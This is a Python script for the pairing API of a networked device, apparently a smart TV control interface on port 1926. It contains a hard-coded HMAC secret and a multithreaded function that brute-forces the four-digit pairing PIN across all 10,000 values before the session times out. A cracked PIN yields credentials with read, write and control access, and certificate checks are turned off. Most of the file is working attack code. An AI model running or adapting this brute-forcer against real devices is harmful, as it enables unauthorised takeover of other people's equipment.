import hmac
import hashlib
import time
import random
import string
import concurrent.futures
import threading
from base64 import b64encode, b64decode

import requests
import urllib3
from requests.auth import HTTPDigestAuth

urllib3.disable_warnings()

SECRET_KEY = b64decode(
    "ZmVay1EQVFOaZhwQ4Kv81ypLAZNczV9sG4KkseXWn1NEk6cXmPKO/MCa9sryslvLCFMnNe4Z4CPXzToowvhHvA=="
)


def _generate_device_id():
    chars = string.ascii_uppercase + string.digits + string.ascii_lowercase
    return ''.join(random.SystemRandom().choice(chars) for _ in range(16))


def _create_signature(timestamp, pin):
    to_sign = str(timestamp).encode() + str(pin).encode()
    sig = hmac.new(SECRET_KEY, to_sign, hashlib.sha1)
    return b64encode(sig.hexdigest().encode()).decode()


def _make_device_spec(device_id):
    return {
        "device_name": "heater",
        "device_os": "Android",
        "app_name": "SmartHome",
        "type": "native",
        "app_id": "app.id",
        "id": device_id,
    }


def pair_with_pin(host, pin):
    device_id = _generate_device_id()
    device = _make_device_spec(device_id)

    r = requests.post(
        f"https://{host}:1926/6/pair/request",
        json={"scope": ["read", "write", "control"], "device": device},
        verify=False, timeout=5,
    )
    data = r.json()
    if data.get("error_id") != "SUCCESS":
        return None, f"Pairing request failed: {data}"

    auth_key = data["auth_key"]
    timestamp = data["timestamp"]
    sig = _create_signature(timestamp, pin.strip())

    r = requests.post(
        f"https://{host}:1926/6/pair/grant",
        json={
            "auth": {
                "auth_AppId": "1",
                "pin": pin.strip(),
                "auth_timestamp": timestamp,
                "auth_signature": sig,
            },
            "device": device,
        },
        verify=False, timeout=5,
        auth=HTTPDigestAuth(device_id, auth_key),
    )

    if r.status_code == 200:
        return {"host": host, "username": device_id, "password": auth_key}, None
    return None, f"Pairing failed: HTTP {r.status_code}"


def bruteforce_pin(host, workers=50, delay=3):
    device_id = _generate_device_id()
    device = _make_device_spec(device_id)

    print("[*] Requesting pairing...")
    r = requests.post(
        f"https://{host}:1926/6/pair/request",
        json={"scope": ["read", "write", "control"], "device": device},
        verify=False, timeout=5,
    )
    data = r.json()
    if data.get("error_id") != "SUCCESS":
        print(f"[-] Pairing failed: {data}")
        return None

    auth_key = data["auth_key"]
    timestamp = data["timestamp"]
    timeout = data.get("timeout", 30)

    print(f"[*] Auth key: {auth_key}, timeout: {timeout}s")
    print(f"[*] Waiting {delay}s for PIN dialog...")
    time.sleep(delay)
    print(f"[*] Bruteforcing with {workers} workers...")

    found = threading.Event()
    session_dead = threading.Event()
    result_pin = [None]
    counter = [0]
    errors = [0]
    lock = threading.Lock()
    start = time.time()

    def timeout_wd():
        time.sleep(timeout)
        if not found.is_set():
            session_dead.set()

    threading.Thread(target=timeout_wd, daemon=True).start()

    def try_pin(pin):
        if found.is_set() or session_dead.is_set():
            return
        pin_str = f"{pin:04d}"
        try:
            sig = _create_signature(timestamp, pin_str)
            resp = requests.post(
                f"https://{host}:1926/6/pair/grant",
                json={
                    "auth": {
                        "auth_AppId": "1",
                        "pin": pin_str,
                        "auth_timestamp": timestamp,
                        "auth_signature": sig,
                    },
                    "device": device,
                },
                verify=False, timeout=3,
                auth=HTTPDigestAuth(device_id, auth_key),
            )
            with lock:
                counter[0] += 1
                if counter[0] == 1:
                    print(f"  [*] First response: HTTP {resp.status_code}")
                if counter[0] % 500 == 0:
                    elapsed = time.time() - start
                    print(f"  ... {counter[0]}/10000 [{elapsed:.1f}s] ({counter[0] / elapsed:.0f}/s)")

            if resp.status_code == 200:
                result_pin[0] = pin_str
                found.set()
        except Exception:
            with lock:
                errors[0] += 1

    pins_up = list(range(5000, 10000))
    pins_down = list(range(4999, -1, -1))

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futures = []
        for pin in pins_up:
            if found.is_set() or session_dead.is_set():
                break
            futures.append(ex.submit(try_pin, pin))
        for pin in pins_down:
            if found.is_set() or session_dead.is_set():
                break
            futures.append(ex.submit(try_pin, pin))
        concurrent.futures.wait(futures, timeout=timeout + 10)

    elapsed = time.time() - start

    if result_pin[0]:
        print(f"\n[+] FOUND PIN: {result_pin[0]} in {elapsed:.1f}s")
        return {"host": host, "username": device_id, "password": auth_key}

    if session_dead.is_set():
        print(f"\n[-] Timeout after {counter[0]} attempts in {elapsed:.1f}s. Run again.")
    else:
        print(f"\n[-] Exhausted {counter[0]} PINs in {elapsed:.1f}s")
    return None
